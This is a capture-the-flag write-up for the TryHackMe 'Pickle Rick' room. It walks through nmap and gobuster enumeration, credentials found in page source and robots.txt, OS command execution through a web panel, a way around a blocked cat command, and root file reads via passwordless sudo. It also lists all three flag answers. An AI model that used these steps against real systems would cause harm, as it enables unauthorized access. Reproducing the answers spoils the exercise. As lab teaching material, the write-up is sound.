# TryHackMe — Pickle Rick

**Platform:** TryHackMe  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web Exploitation / Command Injection  
**Room:** [tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)  

---

## Summary

A Rick and Morty themed room where you find three ingredients to turn Rick back from a pickle. The challenge covers basic web enumeration, source code analysis, command injection via a web command panel, and reading SUID-accessible files to collect all three flags.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV TARGET_IP
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.18
```

---

## Web Enumeration

### Page Source

Viewing the source of the homepage:

```html
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

Username discovered: **R1ckRul3s**

### robots.txt

```bash
curl http://TARGET_IP/robots.txt
```

```
Wubbalubbadubdub
```

This is the password.

### Directory Enumeration

```bash
gobuster dir -u http://TARGET_IP/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html
```

Key findings:
```
/login.php
/portal.php
/assets/
```

---

## Exploitation

### Login

Navigate to `/login.php` and log in with:
- Username: `R1ckRul3s`
- Password: `Wubbalubbadubdub`

The portal at `/portal.php` has a command panel.

### Command Execution

The command panel executes OS commands directly. Test:

```
whoami
# www-data
```

```
ls -la
```

```
Sup3rS3cretPickl3Ingred.txt
clue.txt
...
```

### Ingredient 1

`cat` is blocked — use alternative:

```bash
less Sup3rS3cretPickl3Ingred.txt
# mr. meeseek hair
```

**First ingredient:** `mr. meeseek hair`

### Ingredient 2

```bash
ls /home/rick/
# second ingredients
```

```bash
less /home/rick/second\ ingredients
# 1 jerry tear
```

**Second ingredient:** `1 jerry tear`

### Ingredient 3

Check sudo permissions:

```bash
sudo -l
# (ALL) NOPASSWD: ALL
```

www-data can run anything as root with no password!

```bash
sudo less /root/3rd.txt
# fleeb juice
```

**Third ingredient:** `fleeb juice`

---

## Key Takeaways

- Always check page source — developers sometimes leave credentials in HTML comments
- `robots.txt` can contain passwords (don't overlook it)
- When `cat` is blocked, use `less`, `more`, `head`, `tail`, `strings`, or `base64`
- `sudo -l` revealing `NOPASSWD: ALL` is immediate root access
- Web command panels are essentially OS command injection by design

---

## Flags Summary

| Ingredient | Location | Value |
|-----------|---------|-------|
| 1st | `/var/www/html/Sup3rS3cretPickl3Ingred.txt` | mr. meeseek hair |
| 2nd | `/home/rick/second ingredients` | 1 jerry tear |
| 3rd | `/root/3rd.txt` | fleeb juice |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Web directory enumeration |
| Browser | Login + command panel |
